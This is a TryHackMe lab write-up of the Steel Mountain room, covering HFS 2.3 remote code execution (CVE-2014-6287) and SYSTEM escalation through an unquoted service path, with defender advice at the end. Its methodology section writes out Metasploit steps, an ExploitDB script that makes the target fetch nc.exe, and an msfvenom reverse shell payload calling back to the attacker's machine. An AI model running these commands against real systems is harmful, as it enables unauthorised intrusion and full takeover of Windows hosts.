---
title: "Steel Mountain"
date: 2026-03-06
platform: TryHackMe
difficulty: Medium
category: offensive
summary: "Rejetto HFS RCE via CVE-2014-6287 then SYSTEM via an unquoted service path. Solved with both Metasploit and a fully manual chain using ExploitDB and msfvenom."
---

## Overview

Steel Mountain is a medium-difficulty Windows TryHackMe room built around two patterns that show up constantly in real engagements: **HFS (HTTP File Server) 2.3 macro RCE** and the **unquoted service path** privesc class.

Like HackPark, the room is structured to be solved twice. The Metasploit pass takes ten minutes. The manual pass takes longer but is the only one that teaches you how every piece works.

## Tools Used

- **nmap** for the port scan.
- **HFS detection** by inspecting the page footer (the version string is right there).
- **Metasploit** *exploit/windows/http/rejetto_hfs_exec* for the first pass.
- **ExploitDB 39161.py** for the manual pass.
- **msfvenom** for generating service-aware payloads.
- **PowerUp.ps1** and **winPEAS** for privesc enumeration.
- **sc.exe** to stop and restart the vulnerable service.

## Methodology

**Step 1 - Service enumeration.** A nmap scan returns HTTP on port 8080 running **HFS 2.3**. The version string is right in the page footer.

```bash
nmap -p- -sV <TARGET_IP>
```

**Step 2 - HFS 2.3 macro RCE (CVE-2014-6287).** HFS 2.3 has a critical bug in how it processes macros embedded in template files. Search queries are evaluated through HFS's internal scripting engine, and macros injected in URL parameters execute as the HFS service user. The Metasploit module wraps it cleanly.

```
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <TARGET_IP>
set RPORT 8080
set LHOST <KALI_IP>
exploit
```

A Meterpreter session lands as a low-privileged Windows user. The first flag is in this user's Desktop.

**Step 3 - Manual replication.** The manual path uses **ExploitDB 39161.py**, a Python 2 script that does the same thing without Metasploit. The script requires a hosted *nc.exe* binary because it pulls and runs that to establish the callback.

```bash
# host the nc.exe binary on Kali:
sudo python3 -m http.server 80
# start the listener:
nc -lvnp 4443
# run the exploit (may need multiple executions to win the race):
python2 39161.py <TARGET_IP> 8080
```

A reverse shell lands on netcat.

**Step 4 - Privesc enumeration.** Both **PowerUp.ps1** (PowerShell privesc tool from PowerSploit) and **winPEAS** (enumeration script) surface the same finding: a Windows service named **AdvancedSystemCareService9** has an **unquoted service path**.

```powershell
powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```

The service binary path is something like:

```
C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
```

That path contains a space and is not enclosed in quotation marks in the service registration. **Windows resolves an unquoted path ambiguously**: it tries `C:\Program.exe`, then `C:\Program Files.exe`, then `C:\Program Files (x86)\IObit\Advanced.exe`, and only then the real binary. If the attacker can write any of those intermediate filenames, that's the one that runs.

**Step 5 - Confirm write access and CanRestart.** PowerUp reports:

- Path contains spaces and is unquoted.
- *CanRestart: True* (which is the critical factor).
- The low-priv user has write access to `C:\Program Files (x86)\IObit\`.

*CanRestart* means the service can be stopped and started without admin, so the attacker does not have to wait for a reboot.

**Step 6 - Plant the payload.** A reverse shell payload generated with msfvenom (the *exe-service* format includes the service-control stubs Windows expects from a service binary):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4443 \
  -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Upload Advanced.exe to `C:\Program Files (x86)\IObit\Advanced.exe`.

**Step 7 - Restart the service.**

```cmd
sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```

Windows hits the unquoted path resolution, finds *Advanced.exe* before reaching the real ASCService.exe, and executes it as **NT AUTHORITY\SYSTEM** (because services run as SYSTEM by default).

## Key Takeaways

- **HFS 2.3 is a commonly encountered file server in CTFs and real-world environments and should always be tested for CVE-2014-6287.**
- **PowerUp.ps1 and winPEAS are complementary tools.** Running both reduces the chance of missing a privesc vector.
- **Unquoted service paths are a common Windows misconfiguration**, especially in third-party software installations from older vendors.
- **CanRestart: True is the critical factor** that makes the unquoted path exploitable without waiting for a reboot.
- **The Metasploit shortcut and the manual chain do the same thing.** The manual chain teaches what each piece is doing.

## What a Defender Should Do

- Patch or remove HFS 2.3. There is no scenario where running it on a production network is acceptable in 2024+.
- Audit service paths regularly. The one-liner to find unquoted paths on a host:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "C:\Windows\\" | findstr /v """
```

- Fix unquoted paths by enclosing the binary path in quotation marks in the service registration. Microsoft has known about this for two decades but it still keeps showing up in third-party installers.
- Apply *principle of least privilege* to service installation directories. Strip *Modify* access from non-admin users on every `C:\Program Files` subdirectory.
- Block service restart by non-admin users. The *CanRestart* check is the bug. Service ACLs should not allow non-admin SCM control.
